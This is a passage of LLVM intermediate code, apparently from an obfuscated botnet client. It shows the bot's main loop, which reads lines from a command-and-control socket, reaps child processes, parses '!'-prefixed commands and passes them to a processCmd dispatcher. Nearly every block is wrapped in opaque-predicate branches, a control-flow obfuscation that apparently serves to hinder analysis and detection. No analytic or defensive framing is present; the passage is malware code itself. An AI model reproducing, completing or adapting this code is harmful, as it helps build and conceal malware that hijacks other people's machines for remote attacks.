  %136 = call i32 (i32, i8*, ...) @sockprintf(i32 %130, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.965, i32 0, i32 0), i8* %131, i8* %133, i8* %134, i32 %135, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.966, i32 0, i32 0))
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %137

; <label>:137:                                    ; preds = %727, %470, %originalBBpart265, %129
  %138 = load i32, i32* @x.129
  %139 = load i32, i32* @y.130
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %137
  %146 = load i32, i32* @mainCommSock, align 4
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %148 = call i32 @recvLine(i32 %146, i8* %147, i32 4096)
  store i32 %148, i32* %11, align 4
  %149 = icmp ne i32 %148, -1
  %150 = load i32, i32* @x.129
  %151 = load i32, i32* @y.130
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %149, label %158, label %728

; <label>:158:                                    ; preds = %originalBBpart212
  store i32 0, i32* %12, align 4
  br label %159

; <label>:159:                                    ; preds = %originalBBpart257, %158
  %160 = load i32, i32* @x.129
  %161 = load i32, i32* @y.130
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %159
  %168 = load i32, i32* %12, align 4
  %169 = sext i32 %168 to i64
  %170 = load i64, i64* @numpids, align 8
  %171 = icmp ult i64 %169, %170
  %172 = load i32, i32* @x.129
  %173 = load i32, i32* @y.130
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %171, label %180, label %345

; <label>:180:                                    ; preds = %originalBBpart216
  %181 = load i32, i32* @x.129
  %182 = load i32, i32* @y.130
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %180
  %189 = load i32*, i32** @pids, align 8
  %190 = load i32, i32* %12, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i32, i32* %189, i64 %191
  %193 = load i32, i32* %192, align 4
  %194 = call i32 @waitpid(i32 %193, i32* null, i32 1)
  %195 = icmp sgt i32 %194, 0
  %196 = load i32, i32* @x.129
  %197 = load i32, i32* @y.130
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %195, label %204, label %325

; <label>:204:                                    ; preds = %originalBBpart220
  %205 = load i32, i32* %12, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %14, align 4
  br label %207

; <label>:207:                                    ; preds = %originalBBpart235, %204
  %208 = load i32, i32* @x.129
  %209 = load i32, i32* @y.130
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %207
  %216 = load i32, i32* %14, align 4
  %217 = zext i32 %216 to i64
  %218 = load i64, i64* @numpids, align 8
  %219 = icmp ult i64 %217, %218
  %220 = load i32, i32* @x.129
  %221 = load i32, i32* @y.130
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %219, label %228, label %258

; <label>:228:                                    ; preds = %originalBBpart224
  %229 = load i32*, i32** @pids, align 8
  %230 = load i32, i32* %14, align 4
  %231 = zext i32 %230 to i64
  %232 = getelementptr inbounds i32, i32* %229, i64 %231
  %233 = load i32, i32* %232, align 4
  %234 = load i32*, i32** @pids, align 8
  %235 = load i32, i32* %14, align 4
  %236 = sub i32 %235, 1
  %237 = zext i32 %236 to i64
  %238 = getelementptr inbounds i32, i32* %234, i64 %237
  store i32 %233, i32* %238, align 4
  br label %239

; <label>:239:                                    ; preds = %228
  %240 = load i32, i32* @x.129
  %241 = load i32, i32* @y.130
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %239
  %248 = load i32, i32* %14, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %14, align 4
  %250 = load i32, i32* @x.129
  %251 = load i32, i32* @y.130
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart235, label %originalBB26alteredBB

originalBBpart235:                                ; preds = %originalBB26
  br label %207

; <label>:258:                                    ; preds = %originalBBpart224
  %259 = load i32*, i32** @pids, align 8
  %260 = load i32, i32* %14, align 4
  %261 = sub i32 %260, 1
  %262 = zext i32 %261 to i64
  %263 = getelementptr inbounds i32, i32* %259, i64 %262
  store i32 0, i32* %263, align 4
  %264 = load i64, i64* @numpids, align 8
  %265 = add i64 %264, -1
  store i64 %265, i64* @numpids, align 8
  %266 = load i64, i64* @numpids, align 8
  %267 = add i64 %266, 1
  %268 = mul i64 %267, 4
  %269 = call noalias i8* @malloc(i64 %268) #5
  %270 = bitcast i8* %269 to i32*
  store i32* %270, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %271

; <label>:271:                                    ; preds = %318, %258
  %272 = load i32, i32* @x.129
  %273 = load i32, i32* @y.130
  %274 = sub i32 %272, 1
  %275 = mul i32 %272, %274
  %276 = urem i32 %275, 2
  %277 = icmp eq i32 %276, 0
  %278 = icmp slt i32 %273, 10
  %279 = or i1 %277, %278
  br i1 %279, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %271
  %280 = load i32, i32* %14, align 4
  %281 = zext i32 %280 to i64
  %282 = load i64, i64* @numpids, align 8
  %283 = icmp ult i64 %281, %282
  %284 = load i32, i32* @x.129
  %285 = load i32, i32* @y.130
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br i1 %283, label %292, label %321

; <label>:292:                                    ; preds = %originalBBpart239
  %293 = load i32, i32* @x.129
  %294 = load i32, i32* @y.130
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %292
  %301 = load i32*, i32** @pids, align 8
  %302 = load i32, i32* %14, align 4
  %303 = zext i32 %302 to i64
  %304 = getelementptr inbounds i32, i32* %301, i64 %303
  %305 = load i32, i32* %304, align 4
  %306 = load i32*, i32** %13, align 8
  %307 = load i32, i32* %14, align 4
  %308 = zext i32 %307 to i64
  %309 = getelementptr inbounds i32, i32* %306, i64 %308
  store i32 %305, i32* %309, align 4
  %310 = load i32, i32* @x.129
  %311 = load i32, i32* @y.130
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br label %318

; <label>:318:                                    ; preds = %originalBBpart243
  %319 = load i32, i32* %14, align 4
  %320 = add i32 %319, 1
  store i32 %320, i32* %14, align 4
  br label %271

; <label>:321:                                    ; preds = %originalBBpart239
  %322 = load i32*, i32** @pids, align 8
  %323 = bitcast i32* %322 to i8*
  call void @free(i8* %323) #5
  %324 = load i32*, i32** %13, align 8
  store i32* %324, i32** @pids, align 8
  br label %325

; <label>:325:                                    ; preds = %321, %originalBBpart220
  br label %326

; <label>:326:                                    ; preds = %325
  %327 = load i32, i32* @x.129
  %328 = load i32, i32* @y.130
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %326
  %335 = load i32, i32* %12, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %12, align 4
  %337 = load i32, i32* @x.129
  %338 = load i32, i32* @y.130
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart257, label %originalBB45alteredBB

originalBBpart257:                                ; preds = %originalBB45
  br label %159

; <label>:345:                                    ; preds = %originalBBpart216
  %346 = load i32, i32* @x.129
  %347 = load i32, i32* @y.130
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %345
  %354 = load i32, i32* %11, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %355
  store i8 0, i8* %356, align 1
  %357 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %357)
  %358 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %359 = call i8* @strstr(i8* %358, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.967, i32 0, i32 0)) #9
  %360 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %361 = icmp eq i8* %359, %360
  %362 = load i32, i32* @x.129
  %363 = load i32, i32* @y.130
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %361, label %370, label %387

; <label>:370:                                    ; preds = %originalBBpart261
  %371 = load i32, i32* @x.129
  %372 = load i32, i32* @y.130
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %370
  %379 = load i32, i32* @x.129
  %380 = load i32, i32* @y.130
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %137

; <label>:387:                                    ; preds = %originalBBpart261
  %388 = load i32, i32* @x.129
  %389 = load i32, i32* @y.130
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %387
  %396 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %397 = call i8* @strstr(i8* %396, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.968, i32 0, i32 0)) #9
  %398 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %399 = icmp eq i8* %397, %398
  %400 = load i32, i32* @x.129
  %401 = load i32, i32* @y.130
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %399, label %408, label %425

; <label>:408:                                    ; preds = %originalBBpart269
  %409 = load i32, i32* @x.129
  %410 = load i32, i32* @y.130
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %408
  call void @exit(i32 0) #11
  %417 = load i32, i32* @x.129
  %418 = load i32, i32* @y.130
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  unreachable

; <label>:425:                                    ; preds = %originalBBpart269
  %426 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %426, i8** %15, align 8
  %427 = load i8*, i8** %15, align 8
  %428 = load i8, i8* %427, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp eq i32 %429, 33
  br i1 %430, label %431, label %727

; <label>:431:                                    ; preds = %425
  %432 = load i32, i32* @x.129
  %433 = load i32, i32* @y.130
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %431
  %440 = load i8*, i8** %15, align 8
  %441 = getelementptr inbounds i8, i8* %440, i64 1
  store i8* %441, i8** %16, align 8
  %442 = load i32, i32* @x.129
  %443 = load i32, i32* @y.130
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %450

; <label>:450:                                    ; preds = %462, %originalBBpart277
  %451 = load i8*, i8** %16, align 8
  %452 = load i8, i8* %451, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp ne i32 %453, 32
  br i1 %454, label %455, label %460

; <label>:455:                                    ; preds = %450
  %456 = load i8*, i8** %16, align 8
  %457 = load i8, i8* %456, align 1
  %458 = zext i8 %457 to i32
  %459 = icmp ne i32 %458, 0
  br label %460

; <label>:460:                                    ; preds = %455, %450
  %461 = phi i1 [ false, %450 ], [ %459, %455 ]
  br i1 %461, label %462, label %465

; <label>:462:                                    ; preds = %460
  %463 = load i8*, i8** %16, align 8
  %464 = getelementptr inbounds i8, i8* %463, i32 1
  store i8* %464, i8** %16, align 8
  br label %450

; <label>:465:                                    ; preds = %460
  %466 = load i8*, i8** %16, align 8
  %467 = load i8, i8* %466, align 1
  %468 = zext i8 %467 to i32
  %469 = icmp eq i32 %468, 0
  br i1 %469, label %470, label %471

; <label>:470:                                    ; preds = %465
  br label %137

; <label>:471:                                    ; preds = %465
  %472 = load i8*, i8** %16, align 8
  store i8 0, i8* %472, align 1
  %473 = load i8*, i8** %15, align 8
  %474 = getelementptr inbounds i8, i8* %473, i64 1
  store i8* %474, i8** %16, align 8
  %475 = load i8*, i8** %15, align 8
  %476 = load i8*, i8** %16, align 8
  %477 = call i64 @strlen(i8* %476) #9
  %478 = getelementptr inbounds i8, i8* %475, i64 %477
  %479 = getelementptr inbounds i8, i8* %478, i64 2
  store i8* %479, i8** %15, align 8
  br label %480

; <label>:480:                                    ; preds = %516, %471
  %481 = load i32, i32* @x.129
  %482 = load i32, i32* @y.130
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %480
  %489 = load i8*, i8** %15, align 8
  %490 = load i8*, i8** %15, align 8
  %491 = call i64 @strlen(i8* %490) #9
  %492 = sub i64 %491, 1
  %493 = getelementptr inbounds i8, i8* %489, i64 %492
  %494 = load i8, i8* %493, align 1
  %495 = zext i8 %494 to i32
  %496 = icmp eq i32 %495, 10
  %497 = load i32, i32* @x.129
  %498 = load i32, i32* @y.130
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart283, label %originalBB79alteredBB

originalBBpart283:                                ; preds = %originalBB79
  br i1 %496, label %514, label %505

; <label>:505:                                    ; preds = %originalBBpart283
  %506 = load i8*, i8** %15, align 8
  %507 = load i8*, i8** %15, align 8
  %508 = call i64 @strlen(i8* %507) #9
  %509 = sub i64 %508, 1
  %510 = getelementptr inbounds i8, i8* %506, i64 %509
  %511 = load i8, i8* %510, align 1
  %512 = zext i8 %511 to i32
  %513 = icmp eq i32 %512, 13
  br label %514

; <label>:514:                                    ; preds = %505, %originalBBpart283
  %515 = phi i1 [ true, %originalBBpart283 ], [ %513, %505 ]
  br i1 %515, label %516, label %522

; <label>:516:                                    ; preds = %514
  %517 = load i8*, i8** %15, align 8
  %518 = load i8*, i8** %15, align 8
  %519 = call i64 @strlen(i8* %518) #9
  %520 = sub i64 %519, 1
  %521 = getelementptr inbounds i8, i8* %517, i64 %520
  store i8 0, i8* %521, align 1
  br label %480

; <label>:522:                                    ; preds = %514
  %523 = load i8*, i8** %15, align 8
  store i8* %523, i8** %17, align 8
  br label %524

; <label>:524:                                    ; preds = %568, %522
  %525 = load i8*, i8** %15, align 8
  %526 = load i8, i8* %525, align 1
  %527 = zext i8 %526 to i32
  %528 = icmp ne i32 %527, 32
  br i1 %528, label %529, label %550

; <label>:529:                                    ; preds = %524
  %530 = load i32, i32* @x.129
  %531 = load i32, i32* @y.130
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %529
  %538 = load i8*, i8** %15, align 8
  %539 = load i8, i8* %538, align 1
  %540 = zext i8 %539 to i32
  %541 = icmp ne i32 %540, 0
  %542 = load i32, i32* @x.129
  %543 = load i32, i32* @y.130
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br label %550

; <label>:550:                                    ; preds = %originalBBpart287, %524
  %551 = phi i1 [ false, %524 ], [ %541, %originalBBpart287 ]
  %552 = load i32, i32* @x.129
  %553 = load i32, i32* @y.130
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %550
  %560 = load i32, i32* @x.129
  %561 = load i32, i32* @y.130
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br i1 %551, label %568, label %571

; <label>:568:                                    ; preds = %originalBBpart291
  %569 = load i8*, i8** %15, align 8
  %570 = getelementptr inbounds i8, i8* %569, i32 1
  store i8* %570, i8** %15, align 8
  br label %524

; <label>:571:                                    ; preds = %originalBBpart291
  %572 = load i32, i32* @x.129
  %573 = load i32, i32* @y.130
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %571
  %580 = load i8*, i8** %15, align 8
  store i8 0, i8* %580, align 1
  %581 = load i8*, i8** %15, align 8
  %582 = getelementptr inbounds i8, i8* %581, i32 1
  store i8* %582, i8** %15, align 8
  %583 = load i8*, i8** %17, align 8
  store i8* %583, i8** %18, align 8
  %584 = load i32, i32* @x.129
  %585 = load i32, i32* @y.130
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %592

; <label>:592:                                    ; preds = %596, %originalBBpart295
  %593 = load i8*, i8** %18, align 8
  %594 = load i8, i8* %593, align 1
  %595 = icmp ne i8 %594, 0
  br i1 %595, label %596, label %605

; <label>:596:                                    ; preds = %592
  %597 = load i8*, i8** %18, align 8
  %598 = load i8, i8* %597, align 1
  %599 = zext i8 %598 to i32
  %600 = call i32 @toupper(i32 %599) #9
  %601 = trunc i32 %600 to i8
  %602 = load i8*, i8** %18, align 8
  store i8 %601, i8* %602, align 1
  %603 = load i8*, i8** %18, align 8
  %604 = getelementptr inbounds i8, i8* %603, i32 1
  store i8* %604, i8** %18, align 8
  br label %592

; <label>:605:                                    ; preds = %592
  store i32 1, i32* %20, align 4
  %606 = load i8*, i8** %15, align 8
  %607 = call i8* @strtok(i8* %606, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.969, i32 0, i32 0)) #5
  store i8* %607, i8** %21, align 8
  %608 = load i8*, i8** %17, align 8
  %609 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %608, i8** %609, align 16
  br label %610

; <label>:610:                                    ; preds = %originalBBpart2128, %605
  %611 = load i8*, i8** %21, align 8
  %612 = icmp ne i8* %611, null
  br i1 %612, label %613, label %691

; <label>:613:                                    ; preds = %610
  %614 = load i32, i32* @x.129
  %615 = load i32, i32* @y.130
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %613
  %622 = load i8*, i8** %21, align 8
  %623 = load i8, i8* %622, align 1
  %624 = zext i8 %623 to i32
  %625 = icmp ne i32 %624, 10
  %626 = load i32, i32* @x.129
  %627 = load i32, i32* @y.130
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br i1 %625, label %634, label %673

; <label>:634:                                    ; preds = %originalBBpart299
  %635 = load i32, i32* @x.129
  %636 = load i32, i32* @y.130
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %634
  %643 = load i8*, i8** %21, align 8
  %644 = call i64 @strlen(i8* %643) #9
  %645 = add i64 %644, 1
  %646 = call noalias i8* @malloc(i64 %645) #5
  %647 = load i32, i32* %20, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %648
  store i8* %646, i8** %649, align 8
  %650 = load i32, i32* %20, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %651
  %653 = load i8*, i8** %652, align 8
  %654 = load i8*, i8** %21, align 8
  %655 = call i64 @strlen(i8* %654) #9
  %656 = add i64 %655, 1
  call void @llvm.memset.p0i8.i64(i8* %653, i8 0, i64 %656, i32 1, i1 false)
  %657 = load i32, i32* %20, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %658
  %660 = load i8*, i8** %659, align 8
  %661 = load i8*, i8** %21, align 8
  %662 = call i8* @strcpy(i8* %660, i8* %661) #5
  %663 = load i32, i32* %20, align 4
  %664 = add nsw i32 %663, 1
  store i32 %664, i32* %20, align 4
  %665 = load i32, i32* @x.129
  %666 = load i32, i32* @y.130
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBBpart2124, label %originalBB101alteredBB

originalBBpart2124:                               ; preds = %originalBB101
  br label %673

; <label>:673:                                    ; preds = %originalBBpart2124, %originalBBpart299
  %674 = load i32, i32* @x.129
  %675 = load i32, i32* @y.130
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %673
  %682 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.969, i32 0, i32 0)) #5
  store i8* %682, i8** %21, align 8
  %683 = load i32, i32* @x.129
  %684 = load i32, i32* @y.130
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %610

; <label>:691:                                    ; preds = %610
  %692 = load i32, i32* @x.129
  %693 = load i32, i32* @y.130
  %694 = sub i32 %692, 1
  %695 = mul i32 %692, %694
  %696 = urem i32 %695, 2
  %697 = icmp eq i32 %696, 0
  %698 = icmp slt i32 %693, 10
  %699 = or i1 %697, %698
  br i1 %699, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %691
  %700 = load i32, i32* %20, align 4
  %701 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %700, i8** %701)
  %702 = load i32, i32* %20, align 4
  %703 = icmp sgt i32 %702, 1
  %704 = load i32, i32* @x.129
  %705 = load i32, i32* @y.130
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br i1 %703, label %712, label %726

; <label>:712:                                    ; preds = %originalBBpart2132
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %713

; <label>:713:                                    ; preds = %722, %712
